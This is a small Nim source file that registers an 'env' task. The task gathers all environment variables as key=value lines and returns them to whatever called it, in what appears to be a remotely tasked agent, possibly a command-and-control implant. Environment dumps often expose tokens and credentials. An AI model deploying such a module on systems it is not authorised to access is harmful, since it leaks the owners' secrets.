import std/[os, json, strutils]
import ../types
import ./registry

proc envExecute(taskId: string, params: JsonNode, state: AgentState,
                send: SendMsg): TaskResult =
  var lines: seq[string] = @[]
  for (key, val) in envPairs():
    lines.add(key & "=" & val)
  return TaskResult(output: lines.join("\n"), status: "success", completed: true)

proc initEnv*() =
  register("env", envExecute)
